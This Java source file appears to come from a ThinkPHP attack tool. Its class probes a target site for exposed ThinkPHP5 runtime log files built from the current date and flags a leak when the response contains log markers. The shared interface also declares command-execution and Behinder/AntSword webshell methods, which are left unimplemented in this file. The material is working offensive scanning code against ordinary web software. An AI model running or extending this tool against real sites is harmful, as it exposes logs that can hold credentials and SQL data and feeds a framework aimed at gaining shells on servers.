package com.guitool.tpbomb.payload;

import com.guitool.tpbomb.util.ResultUtils;
import com.guitool.tpbomb.util.UrlUtils;

import java.util.ArrayList;
import java.util.Date;

public class TP5LogLeak implements PayloadTemplate {
    Date date = new Date();
    String year = String.format("%tY", date);
    String month = String.format("%tm", date);
    String day = String.format("%td", date);
    final ArrayList<String> payloadList = new ArrayList<>(){{
        add("runtime/log/" + year + month + "/" + day + ".log");
        add("runtime/log/" + year + month + "/" + day + "_cli.log");
        add("runtime/log/" + year + month + "/" + day + "_error.log");
        add("runtime/log/" + year + month + "/" + day + "_sql.log");
    }};

    @Override
    public ResultUtils checkVulnerability(String url) {
        try {
            for (String payload : payloadList) {
                String result = UrlUtils.doGet(url + payload);
                if (result == null) {
                    continue;
                }
                if (result.contains("[ error ]") || result.contains("[ info ]")) {
                    return new ResultUtils(true, "ThinkPHP5 日志泄露", url + payload);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "ThinkPHP5 日志泄露", "");
    }

    @Override
    public ResultUtils executeVulnerability(String url, String command) {
        return null;
    }

    @Override
    public ResultUtils getBehinderShell(String url) {
        return null;
    }

    @Override
    public ResultUtils getAntswordShell(String url) {
        return null;
    }

}
